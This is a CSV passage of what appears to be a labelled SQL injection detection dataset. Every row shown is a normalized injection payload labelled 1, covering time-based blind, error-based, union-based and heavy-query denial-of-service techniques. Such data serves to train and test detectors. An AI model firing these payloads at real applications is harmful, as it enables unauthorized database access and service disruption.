row_index,payload_norm,label,sqli_type_hint
2730,"select pg_sleep ( 5 ) and ( ( ( ""nvuv"" like ""nvuv",1,
2731,"1'|| ( select 'qwoo' from dual where 8802 = 8802 or elt ( 6272 = 6272,sleep ( 5 ) ) ) ||'",1,
2732,"1"" ) as qayu where 6222 = 6222 union all select null,null,null#",1,
2733,"1 ) union all select null,null,null,null,null,null,null#",1,
2734,"1"" ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
2735,"1"" ) as lkzz where 3565 = 3565 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1,
2736,"1 ) ) as yfvg where 1454 = 1454 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1,
2737,"1"" ) as klur where 7046 = 7046 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
2738,1'+ ( select tdkt where 4535 = 4535,1,
2739,1' ) where 5145 = 5145,1,
2740,"1%"" ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""%"" = """,1,
2741,1' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 'ckmm' like 'ckmm,1,
2742,"1' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( 'zypa' = 'zypa",1,
2743,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( ""%"" = """,1,
2744,"1' ) where 9951 = 9951 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",1,
2745,"1"" ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( ""djwo"" = ""djwo",1,
2746,"1' ) ) as icik where 1440 = 1440 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
2747,select ( case when ( 1412 = 5313 ) then 1412 else 1412* ( select 1412 from mysql.db ) end ) #,1,
2748,"-3737%"" union all select 4452,4452,4452#",1,
2749,1' ) ) and 3814 = 4272--,1,
2750,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and 'nlrk' like 'nlrk",1,
2751,1' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'hcpo' like 'hcpo,1,
2752,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'",1,
2753,"1"" ) where 2680 = 2680 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
2754,"1"" where 2309 = 2309 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
2755,select ( case when ( 5198 = 2518 ) then 5198 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
2756,1' ) waitfor delay '0:0:5' and ( 'vtfs' = 'vtfs,1,
2757,select ( case when ( 8711 = 6432 ) then 1 else 8711* ( select 8711 from master..sysdatabases ) end ) --,1,
2758,"-8238' ) ) union all select 9797,9797,9797,9797,9797,9797,9797,9797#",1,
2759,-8504 where 3086 = 3086 or 1131 = 9188#,1,
